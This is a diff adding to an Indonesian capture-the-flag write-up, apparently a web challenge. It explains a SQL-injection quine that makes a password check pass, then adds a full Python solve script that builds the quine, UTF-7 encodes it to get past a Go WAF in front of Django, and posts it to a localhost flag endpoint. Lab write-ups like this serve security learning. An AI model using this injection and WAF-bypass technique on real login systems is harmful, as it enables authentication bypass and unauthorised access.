@@ -234,4 +234,60 @@ Kita paham bahwa kita harus  menginjeksi password nya tapi masalah nya `assert p
 oke analogy nya gini biasa kita akan mengunakan payload 
 `' UNION SELECT 1, 'admin', (password yang kita buat)`
 nah nanti yang akan di ambil password adalah = (password yang kita buat) nah tapi yang diambil users[0].password = `' UNION SELECT 1, 'admin', (password yang kita buat)`
-nah karena itu lah kita akan menghasil kan wrong password karena nanti `assert password == users[0].password` menghasilkan false, terus solusinya gimana min kita pake sql quine nah sekarang kita tinggal mikir cara buat bobol waf nya. karena parse formnya langsung di kirim ke django kita bisa memanfaatkan celah dengan payload hasi dari 
+nah karena itu lah kita akan menghasil kan wrong password karena nanti `assert password == users[0].password` menghasilkan false, terus solusinya gimana min kita pake sql quine nah sekarang kita tinggal mikir cara buat bobol waf nya. karena parse formnya langsung di kirim ke django kita bisa memanfaatkan celah dengan payload hasi dari quine tadi kita encode utf7 karena golang tidak bisa decode utf7 dan dianggap normal sedang kan django bisa encode utf8 oke kita langsung buat script 
+
+```python title:solve.py
+import requests
+import base64
+
+# ========== 1. Quine Generator (SQL) ==========
+def generate_sql_quine(template: str) -> str:
+    """
+    Menghasilkan string SQL yang ketika dieksekusi akan mengembalikan dirinya sendiri.
+    Placeholder '$$' akan diganti dengan mekanisme REPLACE().
+    """
+    query_with_replace = template.replace(
+        '$$',
+        "REPLACE(REPLACE($$,CHAR(34),CHAR(39)),CHAR(36),$$)"
+    )
+    blueprint = query_with_replace.replace('$$', '"$"').replace("'", '"')
+    final_quine = query_with_replace.replace('$$', "'" + blueprint + "'")
+    return final_quine
+
+# ========== 2. UTF-7 Encoder (Manual Custom) ==========
+def sql_to_utf7_payload(sql_string: str) -> str:
+    """
+    Encode seluruh string SQL menjadi payload UTF-7 (custom),
+    sehingga server mendekode menjadi string SQL asli.
+    """
+    # Encode ke UTF-16 Big Endian
+    utf16_bytes = sql_string.encode('utf-16be')
+    # Encode ke Modified Base64 (ganti '/' dengan ',' dan hilangkan '=')
+    b64_bytes = base64.b64encode(utf16_bytes).replace(b'/', b',').rstrip(b'=')
+    # Bungkus dengan + dan -
+    return b'+' + b64_bytes + b'-'
+
+# ========== 3. Generate payload ==========
+template_sql = "'UNION SELECT 1,'admin',$$;-- "
+quine_sql = generate_sql_quine(template_sql)
+utf7_password = sql_to_utf7_payload(quine_sql).decode()  # string biasa
+
+print("Payload SQL Quine:\n", quine_sql)
+print("\nPayload UTF-7 (password):\n", utf7_password)
+
+# ========== 4. Kirim request exploit ==========
+url = "http://localhost:8081/flag/"
+headers = {
+    "Content-Type": "application/x-www-form-urlencoded;charset=utf-7;",
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+    "Connection": "close"
+}
+data = {
+    "username": "admin",
+    "password": utf7_password   # <- pakai hasil encode otomatis, bukan hardcode
+}
+
+response = requests.post(url, headers=headers, data=data)
+print("\nResponse:\n", response.text)
+```
+
